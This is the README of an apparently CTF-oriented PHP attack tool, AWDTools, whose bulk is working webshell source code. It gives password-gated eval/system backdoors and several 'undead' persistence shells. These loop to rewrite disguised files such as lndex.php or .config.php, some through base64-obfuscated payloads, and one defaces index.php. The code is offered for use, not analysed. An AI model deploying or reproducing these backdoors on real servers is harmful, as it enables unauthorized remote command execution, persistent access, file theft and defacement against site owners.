# AWDTools 说明

## V1.0.0
| Python版本 | 适用语言 | 版本   | 最近更新时间 |
| :----------: | :--------: | :------: | :------------: |
| 3.8+       | php      | V1.0.0 | 2021.12.13    |

## 使用

> 安装所需第三方库
```
pip install -r requirements.txt
```
> 运行命令
```
python main.py
```

## 功能
### 命令执行
> 根据一句话木马后门或者已种后门马来填写攻击`WebShell`来进行攻击

### 木马种植
> 根据一句话木马后门或者已种后门马来填写种马`WebShell`来进行种马

### 文件读取
> 根据一句话木马后门或者已种后门马来填写文件读取`WebShell`来读取文件

### 目标扫描
> 还未开发

### 定时攻击
> 还未开发

## 木马描述
> 双层`MD5`的`D1noH3rmesk1t`的值为：`ddbaedeb6010fcd8df373dd723ff6920`

### common_horse_1
```php
<?php
    if (md5(md5($_GET['h3']))=='ddbaedeb6010fcd8df373dd723ff6920') {
        @eval($_POST['d1no']);
    }
?>
```

### common_horse_2
```php
<?php
    if (md5(md5($_GET['h3']))=='ddbaedeb6010fcd8df373dd723ff6920') {
        @system($_POST['d1no']);
    }
?>
```

### undead_horse_1
> 命令执行不死马

```php
<?php
    ignore_user_abort(True);
    set_time_limit(0);
    unlink(0);
    $file='/var/www/html/public/lndex.php';
    $code='PD9waHAKICAgIGlmIChtZDUobWQ1KCRfR0VUWydoMyddKSk9PSdkZGJhZWRlYjYwMTBmY2Q4ZGYzNzNkZDcyM2ZmNjkyMCcpIHsKICAgICAgICBmaWx0ZXJfdmFyX2FycmF5KGFycmF5KCJ0ZXN0Ij0+JF9QT1NUWyJkMW5vIl0pLGFycmF5KCJ0ZXN0Ij0+YXJyYXkoImZpbHRlciI9PkZJTFRFUl9DQUxMQkFDSywib3B0aW9ucyI9PiJldmFsIikpKTsKICAgIH0KICAgIEBzeXN0ZW0oJ2VjaG8gIkhhY2tlZCBieSBIM3JtZXNrMXQuIiA+IC92YXIvd3d3L2h0bWwvcHVibGljL2luZGV4LnBocCcpOwo/Pg==';
    while (1) {
        file_put_contents($file, base64_decode($code));
        usleep(10);
    }
?>
```
> base64 内容

```php
<?php
    if (md5(md5($_GET['h3']))=='ddbaedeb6010fcd8df373dd723ff6920') {
        filter_var_array(array("test"=>$_POST["d1no"]),array("test"=>array("filter"=>FILTER_CALLBACK,"options"=>"eval")));
    }
    @system('echo "Hacked by H3rmesk1t." > /var/www/html/public/index.php');
?>
```

### undead_horse_2
> 直接读取文件不死马

```php
<?php 
    system('while true;do echo "PD9waHAKICAgIGlmIChtZDUobWQ1KCRfR0VUWydoMyddKSk9PSdkZGJhZWRlYjYwMTBmY2Q4ZGYzNzNkZDcyM2ZmNjkyMCcpIHsKICAgICAgICBAZmlsZV9nZXRfY29udGVudHMoJy9mbGFnJyk7CiAgICAgICAgQGluY2x1ZGUoJy9mbGFnJyk7CiAgICAgICAgQHJlcXVpcmUoJy9mbGFnJyk7CiAgICB9Cj8+" | base64 -d >> /var/www/html/.lndex.php;sleep 0.1;done;');
?>
```

> base64 内容

```php
<?php
    if (md5(md5($_GET['h3']))=='ddbaedeb6010fcd8df373dd723ff6920') {
        @file_get_contents('/flag');
        @include('/flag');
        @require('/flag');
    }
?>
```

### undead_horse_3
> 追加文件写入

```php
<?php
    $file='/var/www/html/public/router.php'; // Must file exists
    $code='PD9waHAgQHN5c3RlbSgnd2hpbGUgdHJ1ZTtkbyBlY2hvICJQejQ4UDNCb2NBb2dJQ0FnYVdZZ0tHMWtOU2h0WkRVb0pGOUhSVlJiSjJnekoxMHBLVDA5SjJSa1ltRmxaR1ZpTmpBeE1HWmpaRGhrWmpNM00yUmtOekl6Wm1ZMk9USXdKeWtnZXdvZ0lDQWdJQ0FnSUVCbGRtRnNLQ1JmVUU5VFZGc25aREZ1YnlkZEtUc0tJQ0FnSUgwS1B6ND0iIHwgYmFzZTY0IC1kID4+IC92YXIvd3d3L2h0bWwvcHVibGljLy5jb25maWcucGhwO3NsZWVwIDU7ZG9uZTsnKTs/Pg==';
    file_put_contents($file, base64_decode($code), FILE_APPEND);
?>
```
> base64 内容

```php
<?php @system('while true;do echo "Pz48P3BocAogICAgaWYgKG1kNShtZDUoJF9HRVRbJ2gzJ10pKT09J2RkYmFlZGViNjAxMGZjZDhkZjM3M2RkNzIzZmY2OTIwJykgewogICAgICAgIEBldmFsKCRfUE9TVFsnZDFubyddKTsKICAgIH0KPz4=" | base64 -d >> /var/www/html/public/.config.php;sleep 5;done;');?>
```
> base64 内容

```php
?><?php
    if (md5(md5($_GET['h3']))=='ddbaedeb6010fcd8df373dd723ff6920') {
        @eval($_POST['d1no']);
    }
?>
```

### undead_horse_4
> 写入`.htaccess`或者`.user.ini`文件